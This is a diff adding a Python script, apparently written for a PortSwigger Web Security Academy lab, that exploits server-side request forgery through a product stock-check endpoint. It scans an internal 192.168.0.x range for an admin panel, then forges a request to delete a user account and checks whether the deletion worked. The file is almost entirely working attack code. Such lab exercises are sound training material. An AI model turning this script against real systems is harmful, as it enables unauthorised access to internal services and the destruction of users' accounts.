@@ -1,0 +1,108 @@
+import requests
+import pyfiglet
+import sys
+import urllib3
+import argparse
+from pwn import *
+from itertools import cycle
+
+from pyfiglet import figlet_format
+from random import randrange
+from termcolor import colored
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'info'
+
+def parse_args():
+    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser.add_argument('-u','--url',
+                        dest = "url",
+                        help = "your target ex : https://0a3000ad04bcc1d581618e43005400ad.web-security-academy.net/",
+                        default = "https://0a250068031450d5835cdc2a002b0069.web-security-academy.net",
+                        required = True)
+    parser.add_argument('-user','--user',
+                        dest = "user",
+                        help = "your tuser : (carlos or wiener )",
+                        default = "carlos",
+                        required = False)
+    return parser.parse_args()
+
+def banner():
+    list=pyfiglet.FigletFont.getFonts()
+    print(figlet_format("ssrf exploit", font = list[randrange(len(list)-1)] ))
+    print(colored("Build a Simple ssrf Script with Python", 'yellow'))
+    print(colored("Author: @oussamabinike\n", 'yellow'))
+
+def post(url,parame):
+    path='/product/stock'
+    try:
+        
+        debug('post request to: %s with parame: %s' %(url+path,parame)+'\n')
+        r=requests.post(url=url+path,verify=False,data=parame,allow_redirects=True,timeout=5)
+        return r
+    except Exception:
+        pass
+
+def exploit(url,admin_pannel,user):
+    #admin_pannel='http://192.168.0.112:8080/admin'
+    info(colored('trying to delete user %s ..','blue')%user)
+
+    # delete user 
+    parame=f'{admin_pannel}/delete?username={user}'  #http://192.168.0.112:8080/admin/delete?username=wiener"
+    r=post(url,parame)
+
+    # check if we delete the user
+    info(colored('check if we have deleted the user %s ..','blue')%user)
+    r=post(url,admin_pannel)
+
+    if r.status_code == 200:
+        if 'carlos'  in r.text:
+            return False
+        else:
+            return True
+    else:
+        return False
+    
+
+def find_admin_pannel(url):
+    for i in range(1,255):
+        parame=f'stockApi=http://192.168.0.{i}:8080/admin'
+        r=post(url=url,parame=parame)
+
+        if r.status_code == 200:
+            info(colored('we found the admin pannel','yellow'))
+            info(colored(parame,'green')+'\n')
+            return parame
+        else:
+            sys.stdout.write('\r'+colored(parame,'red')+'\n') 
+            sys.stdout.flush()
+    return False
+    
+def main():
+    banner()
+    url = parse_args().url
+    if url[len(url)-1]=='/':
+        url= url[:-1]
+        print(url)
+    user= parse_args().user
+    if user.lower()!='carlos' and user.lower()!='wiener':
+        info(colored('Just enter user Carlos or Winner','red'))
+        sys.exit()
+    else:
+        admin_pannel=find_admin_pannel(url)
+        if admin_pannel:
+            resulte=exploit(url,admin_pannel,user)
+
+            if resulte:
+                info(colored('The exploite is successful','green'))
+            else:
+                info(colored('The exploit is unsuccessful','red'))
+        else:
+            info(colored('The exploit is unsuccessful','red'))
+
+
+if __name__=='__main__':
+    main()
